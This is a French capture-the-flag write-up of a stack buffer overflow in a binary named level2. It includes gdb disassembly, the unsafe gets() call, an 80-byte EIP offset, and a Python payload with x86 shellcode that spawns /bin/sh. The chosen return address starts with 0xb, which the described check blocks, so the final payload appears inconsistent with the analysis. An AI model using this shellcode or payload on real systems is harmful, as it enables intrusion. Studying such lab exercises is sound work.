@@ -1,0 +1,60 @@
+Nous sommes ici en presence, comme au niveau precendent d’un binaire level2
+./level2
+toto
+toto
+Cette fonction va return sur la sortie standard ce que nous lui passons
+
+Decomposons ce binaire grace a gdb level2 -> disas main :
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   ebp
+   0x08048540 <+1>:	mov    ebp,esp
+   0x08048542 <+3>:	and    esp,0xfffffff0
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave
+   0x0804854b <+12>:	ret
+End of assembler dump.
+Nous voyons la prensence d’une fonction p. Desassemblons la egalement :
+Dump of assembler code for function p:
+   0x080484d4 <+0>:		push   ebp
+   0x080484d5 <+1>:		mov    ebp,esp
+   0x080484d7 <+3>:		sub    esp,0x68
+   0x080484da <+6>:		mov    eax,ds:0x8049860
+   0x080484df <+11>:	mov    DWORD PTR [esp],eax
+   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
+   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
+   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484fb <+39>:	and    eax,0xb0000000
+   0x08048500 <+44>:	cmp    eax,0xb0000000
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+   0x08048507 <+51>:	mov    eax,0x8048620
+   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
+   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
+   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
+   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
+   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
+   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
+   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:	leave
+   0x0804853e <+106>:	ret
+End of assembler dump.
+Nous voyons la presence encore une fois d’un appel a la fonction gets. Il doit donc y avoir une vulnerabilite a ce niveau. Cependant juste apres l'appel a la fonction gets nous avons une verification qui nous empeche de faire appel a une adresse commencant par 0xb.
+En effet en utilisant comme dan le level precedent le site https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ nous trouvons l'offset qui est de 80.
+Contrairement au level1, il n'y a aucune commande qui ouvre un shell nul part, nous allons donc devoir le faire nous meme en injectant un shellcode
+Pour bypass la comparaison dans p nous pouvons set le flag  et voir ce qu'il se passe apres en mettant un breakpoint sur l'appel du jne et en faisant set $eflags = $eflags | 64
+En continuant nous voyons que le printf va print l'adresse du eip sauvegardée (0x08048516)
+
+import struct
+pad = "\x41" * 80
+EIP = struct.pack("I", 0xbffff6fc)
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+NOP = "\x90" * 100
+print pad + EIP + NOP + shellcode
